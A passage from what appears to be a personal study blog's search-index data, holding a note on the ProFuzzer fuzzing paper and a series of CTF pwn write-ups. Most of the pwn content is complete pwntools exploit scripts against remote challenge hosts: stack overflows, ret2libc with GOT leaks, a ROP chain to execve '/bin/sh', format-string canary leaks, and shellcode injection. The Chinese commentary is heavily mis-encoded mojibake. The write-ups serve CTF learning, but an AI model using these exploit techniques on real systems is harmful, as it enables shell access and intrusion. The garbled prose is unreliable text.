input as new seed and reprobing it\nType Guided Mutation two step:\nexploration mutation:\nlimit the mutation to the legitimate values of the field type to achieve better coverage. do not allow any mutation on raw data fields exploitation mutation\nexploit a set of special values (for the specific field type) that could lead to potential attacks. åœ¨å¼•è¨€éƒ¨åˆ†ï¼Œä½œè€…æå‡ºä¸€ä¸ªå¾ˆå¥½çš„è§‚ç‚¹ï¼Œå°±æ˜¯ä¸€ä¸ªå…¨é¢çš„ã€ç‰¹å®šäºåº”ç”¨ç¨‹åºçš„ã€è¯­ä¹‰ä¸°å¯Œçš„è¾“å…¥è§„èŒƒå¯¹äºæ¨¡ç³Šæµ‹è¯•æ¥è¯´æ˜¯ä¸å¿…è¦çš„ã€‚æ›´æœ‰ç”¨çš„ä¿¡æ¯æ˜¯è¯†åˆ«å¯¹æ¨¡ç³Šæµ‹è¯•è‡³å…³é‡è¦çš„ç‰¹æ®Šç±»å‹çš„å­—æ®µã€‚\nç›®çš„ï¼š æ–¹æ³•ï¼š æ„ä¹‰ï¼š æ•ˆæœï¼š\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/profuzzer-on-the-fly-input-type-probing-for-better-zero-day-vulnerability-discovery/","summary":"æ–‡è¯‘åï¼šprofuzzerï¼šå®æ—¶è¾“å…¥ç±»å‹æ¢æµ‹ï¼Œä»¥æ›´å¥½åœ°å‘ç°é›¶æ—¥æ¼æ´ ä½œè€…ï¼šæ¸¸ä¼Ÿ å•ä½ï¼šæ™®é¡¿å¤§å­¦ å›½å®¶ï¼š #ç¾å›½ å¹´ä»½ï¼š #2019å¹´ æ¥æºï¼š #SP å…³é”®å­—ï¼š #fuzzing ä»£","title":"ProFuzzer On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery"},{"content":"![[åˆ·é¢˜#2023.2.9 JarvisOJ fm]]\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/pwn%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","summary":"![[åˆ·é¢˜#2023.2.9 JarvisOJ fm]]","title":"PWNæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"},{"content":"picoctf_2018_buffer overflow 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * from LibcSearcher import* # context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; elf = ELF(\u0026#39;./bin/PicoCTF_2018_buffer_overflow_2\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 28842) # elf win = elf.symbols[\u0026#39;win\u0026#39;] main_addr = elf.symbols[\u0026#39;main\u0026#39;] a1 = 0x0DEADBEEF a2 = 0x0DEADC0DE print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x6c + p32(0) + p32(win) + p32(main_addr) + p32(a1) + p32(a2) p.sendline(payload) p.interactive() 2023.6.4 jarvisoj_test_your_memory è¿™ä¸ªé¢˜æ³¨æ„è¦æœ€åè¿”å›åˆ°mainå‡½æ•°ï¼Œä½¿å¾—ç¨‹åºæ­£å¸¸ç»“æŸï¼Œä¸ç„¶ç¨‹åºå´©æºƒä¸ä¼šå›æ˜¾flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * from LibcSearcher import* # context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; elf = ELF(\u0026#39;./bin/memory\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 29968) # elf system = elf.symbols[\u0026#39;system\u0026#39;] catflag = 0x080487E0 main_addr = elf.symbols[\u0026#39;main\u0026#39;] payload = b\u0026#39;a\u0026#39; * 0x13 + p32(0) + p32(system) + p32(main_addr) + p32(catflag) p.sendline(payload) p.interactive() 2023å¹´5æœˆ15æ—¥ inndy_rop è¿™ä¸ªé¢˜æ˜¯é™æ€ç¼–è¯‘ï¼Œæ€ä¹ˆçœ‹å‡ºæ¥çš„å‘¢ï¼Œå°±æ˜¯ç‰¹åˆ«idaçœ‹èµ·æ¥ç‰¹å¤æ‚ï¼Œå°±æ˜¯é™æ€ç¼–è¯‘çš„ç»“æœã€‚é™æ€ç¼–è¯‘å°±ä¸ä¼šè°ƒç”¨libcä¸­çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¸å­˜åœ¨æ³„éœ²ç‰ˆæœ¬åˆ©ç”¨libcçš„å‡½æ•°äº†ã€‚ æ‰€ä»¥ä½¿ç”¨ROPgadgetçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œç›´æ¥åˆ©ç”¨ç¨‹åºä¸­çš„ç‰‡æ®µæ‹¼å‡‘ropé“¾ã€‚ ROPgadget --binary rop --ropchain\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from pwn import * r = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 25107) p = b\u0026#39;a\u0026#39;*(0xc+4) p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806ecda) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea060) # @ .data p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080b8016) p += b\u0026#39;/bin\u0026#39; p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806ecda) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea064) # @ .data + 4 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080b8016) # pop eax ; ret p += b\u0026#39;//sh\u0026#39; p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806ecda) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080492d3) # xor eax, eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080481c9) # pop ebx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea060) # @ .data p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080de769) # pop ecx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806ecda) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080492d3) # xor eax, eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806c943) # int 0x80 r.sendline(payload) r.interactive() mrctf2020_shellcode è¿™ä¸ªé¢˜çš„ç‚¹æ˜¯æ³¨æ„ç¯å¢ƒçš„é…ç½® context(arch = 'amd64', os = 'linux', log_level = 'debug')\npwnable_orw è¿™ä¸ªé¢˜æœ‰ç‚¹æ„æ€ åœ¨ orw_seccomp å‡½æ•°ä¸­æœ‰ä¸ª prctl å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å†…æ ¸ä¸­çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œä»–å¯ä»¥é™åˆ¶ç¨‹åºä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ„æ€æ˜¯æˆ‘ä»¬ä¸èƒ½åŠ«æŒç¨‹åºæµå»æ‰§è¡Œ execve ç¨‹åºè°ƒç”¨äº†ã€‚ (1). PR_SET_SECCOMP (22)ï¼šå½“ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ PR_SET_SECCOMP, ç¬¬äºŒä¸ªå‚æ•° argv2ä¸º1çš„æ—¶å€™ï¼Œè¡¨ç¤ºå…è®¸çš„ç³»ç»Ÿè°ƒç”¨æœ‰ readï¼Œwriteï¼Œexit å’Œ sigereturnï¼›å½“ argv ç­‰äº2çš„æ—¶å€™ï¼Œè¡¨ç¤ºå…è®¸çš„ç³»ç»Ÿè°ƒç”¨ç”± argv3æŒ‡å‘ sock_fprog ç»“æ„ä½“å®šä¹‰ï¼Œè¯¥ç»“æ„ä½“æˆå‘˜æŒ‡å‘çš„ sock_filter å¯ä»¥å®šä¹‰è¿‡æ»¤ä»»æ„ç³»ç»Ÿè°ƒç”¨å’Œç³»ç»Ÿè°ƒç”¨å‚æ•°ã€‚ (2). PR_SET_NO_NEWPRIVS (38): prctl (38,1,0,0,0)è¡¨ç¤ºç¦ç”¨ç³»ç»Ÿè°ƒç”¨ execve ()å‡½æ•°ï¼ŒåŒæ—¶ï¼Œè¿™ä¸ªé€‰é¡¹å¯ä»¥é€šè¿‡ fork ()å‡½æ•°å’Œ clone ()å‡½æ•°ç»§æ‰¿ç»™å­è¿›ç¨‹ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸¤å¥ç¨‹åºè¡¨ç¤ºé™åˆ¶äº† execve ç³»ç»Ÿè°ƒç”¨ï¼Œåªç•™ç»™ v1 æŒ‡å‘çš„ç³»ç»Ÿè°ƒç”¨ï¼Œsys_openï¼Œsys_readï¼Œsys_writeã€‚ ç»“åˆä¸»å‡½æ•°ç›´æ¥æ‰§è¡Œäº†æˆ‘ä»¬çš„è¾“å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ æ‰“å¼€ flagã€è¯» flag å’Œå†™ flag çš„ä¸‰æ®µ shellcode ç„¶åç›´æ¥è¾“å…¥å°±å¯ä»¥å¾—åˆ° flag äº†ã€‚ å¯ä»¥ç›´æ¥é€šè¿‡ shellcraft æ„å»ºå¯¹åº”çš„ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 25953) # context.log_level = \u0026#39;debug\u0026#39; shellcode = shellcraft.open(\u0026#39;/flag\u0026#39;) shellcode += shellcraft.read(\u0026#39;eax\u0026#39;,\u0026#39;esp\u0026#39;,100) shellcode += shellcraft.write(1,\u0026#39;esp\u0026#39;,100) shellcode = asm(shellcode) p.sendline(shellcode) print(p.recvline()) # p.interactive() ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 char*file=\u0026#39;flag\u0026#39;; sys_open(file,0,0); xor ecx,ecx; mov eax,0x5; # eax = sys_open push ecx; # å­—ç¬¦ä¸²ç»“å°¾\u0026#34;\\00\u0026#34; push 0x67616c66; # \u0026#34;flagå­—ç¬¦ä¸²çš„16è¿›åˆ¶è¡¨ç¤ºï¼Œç”±äºå°ç«¯åºï¼Œæ‰€ä»¥æ˜¯ä»å³å¾€å·¦\u0026#34; mov ebx,esp; # ebx = const char __user *filename xor edx,edx; # edx = int mode è®¾å®šæƒé™çš„ int 0x80; sys_read(3,file,0x30); mov eax,0x3; # eax = sys_read mov ecx,ebx; # ecx = char __user *buf ç¼“å†²åŒºï¼Œè¯»å‡ºçš„æ•°æ®--\u0026gt;ä¹Ÿå°±æ˜¯è¯»â€œflagâ€ mov ebx,0x3; # ebx = unsigned int fd = 3 æ–‡ä»¶æè¿°ç¬¦ mov dl,0x30; # edx = size_t count å¯¹åº”å­—èŠ‚æ•° int 0x80; sys_write(1,file,0x30); mov eax,0x4; # eax = sys_write mov bl,0x1; # ebx = unsigned int fd = 1 mov edx,0x30 # edx = size_t count int 0x80; bjdctf_2020_babyrop2 è¿™ä¸ªé¢˜æœ‰ carryï¼Œé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ² carryï¼Œcarry çš„ä½ç½®ä¸€èˆ¬åœ¨ ebp çš„ä¸Šé¢ ç„¶åæŒ‰ç…§ ret2libc è¿›è¡Œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 from pwn import * from LibcSearcher import * # context.log_level = \u0026#39;debug\u0026#39; elf = ELF(\u0026#39;bjdctf_2020_babyrop2\u0026#39;) libc = ELF(\u0026#39;./libc-2.23.so\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 27525) # elf puts_got = elf.got[\u0026#39;puts\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] vuln = elf.symbols[\u0026#39;vuln\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] #gadgets rdi = 0x0000000000400993 rsi_r15 = 0x4006b1 #get carry print(p.recvline()) print(p.recvline()) print(p.recvline()) payload = b\u0026#39;%7$p\u0026#39; p.sendline(payload) p.recvuntil(\u0026#34;0x\u0026#34;) canary = int(p.recv(16),16) print(hex(canary)) #leak libcbase print(p.recvline()) print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x18 + p64(canary) + b\u0026#39;a\u0026#39; * 0x8 + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln) p.sendline(payload) puts_addr = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(puts_addr)) # cal addr libc_base = puts_addr - libc.symbols[\u0026#34;puts\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # libc = LibcSearcher(\u0026#39;read\u0026#39;, read_addr) # libc_base = read_addr - libc.dump(\u0026#34;read\u0026#34;) # system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) #attack print(p.recvline()) print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x18 + p64(canary) + b\u0026#39;a\u0026#39; * 0x8 + p64(rdi) + p64(str_bin_sh) + p64(system_addr) p.sendline(payload) p.interactive() bjdctf_2020_router è¿™ä¸ªé¢˜æœ‰æ„æ€ï¼Œè®°å½•ä¸€ä¸‹ å…³é”®æ˜¯ Linux ä¸‹æŒ‡ä»¤å¯ä»¥ç”¨åˆ†å·æ‹¼æ¥ jarvisoj_level4 ç®€å•çš„ ret2libc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * from LibcSearcher import* elf = ELF(\u0026#39;level4\u0026#39;) libc = ELF(\u0026#39;./libc/libc-2.23-ubuntu16-32.so\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 27350) # elf write_got = elf.got[\u0026#39;write\u0026#39;] write_plt = elf.plt[\u0026#39;write\u0026#39;] vuln = elf.symbols[\u0026#39;vulnerable_function\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] #gadgets # rdi = 0x4006b3 # rsi_r15 = 0x4006b1 #leak libcbase payload = b\u0026#39;a\u0026#39; * 0x8c + p32(write_plt) + p32(vuln) + p32(1) + p32(write_got) + p32(4) p.sendline(payload) write_addr = u32(p.recv(4)) print(hex(write_addr)) # cal addr libc_base = write_addr - libc.symbols[\u0026#34;write\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # libc = LibcSearcher(\u0026#39;read\u0026#39;, read_addr) # libc_base = read_addr - libc.dump(\u0026#34;read\u0026#34;) # system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) #attack payload = b\u0026#39;a\u0026#39; * 0x8c + p32(system_addr) + p32(0) + p32(str_bin_sh) p.sendline(payload) p.interactive() jarvisoj_level3_x64 è¿™ä¸ªé¢˜çœŸçš„å‘çˆ¹ é¦–å…ˆæ˜¯ç”¨æœ¬åœ°çš„ libc æ²¡è§£å‡ºæ¥ï¼Œç„¶åç”¨ libcsearch ä¹Ÿæ²¡è§£å‡ºæ¥ ç„¶å read æ¢æˆ write æ‰æˆåŠŸ å·²ç»é‡åˆ°ä¸¤æ¬¡ read çš„ libc åœ°å€è§£ä¸å‡ºæ¥äº†ï¼Œä»¥åä¸ç”¨ read 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 from pwn import * from LibcSearcher import* elf = ELF(\u0026#39;level3_x64\u0026#39;) libc = ELF(\u0026#39;./libc/libc-2.23-ubuntu16-64.so\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 27049) # elf write_got = elf.got[\u0026#39;write\u0026#39;] write_plt = elf.plt[\u0026#39;write\u0026#39;] vuln = elf.symbols[\u0026#39;vulnerable_function\u0026#39;] #gadgets rdi = 0x4006b3 rsi_r15 = 0x4006b1 #å› ä¸ºreadå‡½æ•°å·²ç»å°†rdxè®¾ç½®ä¸º0x200è¶³å¤Ÿæˆ‘ä»¬ç”¨äº† #leak libcbase print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x88 + p64(rdi) + p64(1) + p64(rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(vuln) p.sendline(payload) write_addr = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(write_addr)) #cal addr # libc_base = read_addr - libc.symbols[\u0026#34;read\u0026#34;] # system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] # str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() libc = LibcSearcher(\u0026#39;write\u0026#39;, write_addr) libc_base = write_addr - libc.dump(\u0026#34;write\u0026#34;) system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) #attack # print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x88 + p64(0x400648) + p64(rdi) + p64(str_bin_sh) + p64(system_addr) + p64(vuln) p.sendafter(\u0026#39;Input:\\n\u0026#39;, payload) p.interactive() ez_pz_hackover_2016 å†™æƒ¯äº† ret2libc éƒ½å¿˜è®°æ€ä¹ˆ ret2text äº†\næŠŠ shellcode å†™å…¥æ ˆï¼Œç„¶åå°†è¿”å›åœ°å€è¦†ç›–ä¸º shellcode è¿™ä¸ªé¢˜æˆ‘æœ‰ç‚¹æƒ³å½“ç„¶äº†ï¼Œä¸€å¼€å§‹å°† shellcode å†™å…¥é‚£ä¸ª s çš„ä½ç½®ï¼Œæ²¡è€ƒè™‘é•¿åº¦å¤Ÿä¸å¤Ÿ è€Œä¸”è¿™ä¸ªé¢˜ ida åˆ†æåˆ°çš„åç§»ä¸å¯¹ï¼Œå®é™…è¦åŠ¨æ€å»è°ƒ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 27493) shellcode = asm(shellcraft.sh()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvuntil(\u0026#39;crash: \u0026#39;)) s_addr = int(p.recv(10), 16) print(hex(s_addr)) print(p.recvline()) print(p.recvline()) payload = b\u0026#39;crashme\\x00\u0026#39; payload = payload.ljust(26, b\u0026#39;a\u0026#39;) payload += p32(s_addr - 0x1c) + shellcode p.sendline(payload) print(p.recvline()) p.interactive() ciscn_2019_c_1 è¿™ä¸ªé¢˜å¤ªæ¶å¿ƒäº†ï¼Œåšäº†å¥½ä¹…\n64 ä½ç”¨åˆ° bin/sh è®°å¾— ret å¹³æ ˆ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 from pwn import * elf = ELF(\u0026#39;ciscn_2019_c_1\u0026#39;) libc = ELF(\u0026#39;./libc/libc-2.27-Ubuntu18-64.so\u0026#39;) # p = process(\u0026#39;ciscn_2019_c_1\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 26942) puts_plt = elf.plt[\u0026#39;puts\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] encrypt = elf.symbols[\u0026#39;encrypt\u0026#39;] pop_rdi=0x400c83 ret=0x4006b9 print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) p.sendline(\u0026#39;1\u0026#39;) print(p.recvline()) payload = b\u0026#39;\\x00\u0026#39; + b\u0026#39;a\u0026#39; * (0x50 + 8 - 1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(encrypt) p.sendline(payload) print(p.recvline()) print(p.recvline()) puts_addr = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(puts_addr)) print(p.recvline()) libc_base = puts_addr - libc.symbols[\u0026#34;puts\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() print(p.recvline()) payload = b\u0026#39;\\x00\u0026#39; + b\u0026#39;a\u0026#39; * (0x50 + 8 - 1) + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr) p.sendline(payload) p.sendline(payload) p.sendline(payload) p.interactive() jarvisoj_level3 è¿™ä¸ªé¢˜å¤ªç®€å•ï¼Œæ²¡å•¥è¯´çš„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 from pwn import * from LibcSearcher import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 28242) elf = ELF(\u0026#39;level3\u0026#39;) libc = ELF(\u0026#39;libc-2.23-ubuntu16-32.so\u0026#39;) write_plt = elf.plt[\u0026#39;write\u0026#39;] read_got = elf.got[\u0026#39;read\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] payload = b\u0026#39;a\u0026#39; * (0x88 + 4) + p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4) p.sendline(payload) print(p.recvuntil(\u0026#39;\\n\u0026#39;)) read_addr = u32(p.recv(4)) print(hex(read_addr)) libc_base = read_addr - libc.symbols[\u0026#34;read\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # libc = LibcSearcher(\u0026#39;printf\u0026#39;, printf_addr) # libc_base = printf_addr - libc.dump(\u0026#34;printf\u0026#34;) # system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) payload = b\u0026#39;a\u0026#39; * (0x88 + 4) + p32(system_addr) + p32(main) + p32(str_bin_sh) p.sendline(payload) p.interactive() 2023.5.3 HarekazeCTF2019 baby_rop2 è¿™é“é¢˜å­¦ä¹ åˆ°äº†å‡ ä¸ªç‚¹\n64 ä½è®°å¾—ç”¨å¯„å­˜å™¨ï¼Œ32 ä½ä¼ å‚æ˜¯åœ¨æ ˆä¸Š è¦æ‡‚å¾—å¤šè¯•å‡ ä¸ªï¼Œè¿™é“é¢˜çš„ printf_got ç”¨ä¸äº†ï¼Œé‚£å°±æ¢æˆ read å…³äºæ¥æ”¶åœ°å€ï¼Œè²Œä¼¼æ˜¯ 32 ä½å’Œ 64 ä½ä¸å¤ªä¸€æ ·ï¼Œå§‘ä¸”è¿™ä¹ˆè®¤ä¸ºå§ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from pwn import * from LibcSearcher import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 29445) elf = ELF(\u0026#39;babyrop2\u0026#39;) libc = ELF(\u0026#39;libc.so.6\u0026#39;) printf_plt = elf.plt[\u0026#39;printf\u0026#39;] printf_got = elf.got[\u0026#39;printf\u0026#39;] read_got = elf.got[\u0026#39;read\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] format_str = 0x400770 rdi = 0x0400733 rsi=0x400731 payload = b\u0026#39;a\u0026#39; * (0x20 + 8) + p64(rdi) + p64(format_str) + p64(rsi) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main) p.sendline(payload) #32ä½ç”¨è¿™ä¸ª # print(p.recvuntil(\u0026#39;\\n\u0026#39;)) # read_addr = u32(p.recv(4)) #64ä½ç”¨è¿™ä¸ª read_addr = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(read_addr)) libc_base = read_addr - libc.symbols[\u0026#34;read\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # libc = LibcSearcher(\u0026#39;printf\u0026#39;, printf_addr) # libc_base = printf_addr - libc.dump(\u0026#34;printf\u0026#34;) # system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) payload = b\u0026#39;a\u0026#39; * (0x20 + 8) + p64(rdi) + p64(str_bin_sh) + p64(system_addr) p.sendline(payload) p.interactive() 2023.5.3 jarvisoj_tell_me_something è¿™ä¸ªé¢˜æœ‰ç‚¹æ„æ€ï¼Œå…¶å®æ€è·¯å°±æ˜¯æ™®é€šæ ˆæº¢å‡º ret2textï¼Œä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ä¸ªé¢˜çš„æ ˆå¸§ä¸­æ²¡æœ‰ ebpã€‚ å³è¾¹æ˜¯æ­£å¸¸å‡½æ•°ï¼Œå·¦è¾¹æ˜¯è¿™ä¸ªé¢˜çš„ä¸»å‡½æ•°ã€‚è¿™ä¸ªé¢˜è°ƒæ•´äº† rsp åå°±ç›´æ¥ ret äº†ï¼Œæ²¡æœ‰ pop rbpï¼ˆä¹Ÿå°±æ˜¯è¯´ leave æŒ‡ä»¤ä¸å®Œæ•´ï¼‰ æ‰€ä»¥æˆ‘ä»¬åœ¨æº¢å‡ºçš„æ—¶å€™å°±ä¸è¦ç®—ä¸Š rbp çš„ 8 ä¸ªå­—èŠ‚äº†ï¼Œåªè¦†ç›– 88 ä¸ªå­—èŠ‚å°±å¤Ÿäº†ã€‚\n1 2 3 4 5 6 7 8 9 from pwn import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 28091) flag_addr = 0x400620 payload = b\u0026#39;a\u0026#39; * 0x88 + p64(flag_addr) p.sendline(payload) p.interactive() 2023.2.9 JarvisOJ fm ^6d185f\næ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè¿›è¡Œä¸€ä¸ªä»»æ„åœ°å€å†…å­˜çš„è¦†ç›–ã€‚æˆ‘ä»¬å°è¯•å°† x çš„å€¼æ”¹æˆ 4ã€‚ é¦–å…ˆæ¥æ‹ä¸€ä¸‹æ€è·¯ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨æ€»æ˜¯å¾ˆç»•ã€‚\né¦–å…ˆæˆ‘ä»¬æƒ³è¦æŠŠ 4 å†™åˆ° addr_of_xï¼Œ\u0026mdash;-\u0026gt;ä½¿ç”¨%nï¼Œ%n å¯ä»¥å°†è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥æŒ‡å®šçš„å‚æ•°æŒ‡å‘çš„åœ°å€å¤„ 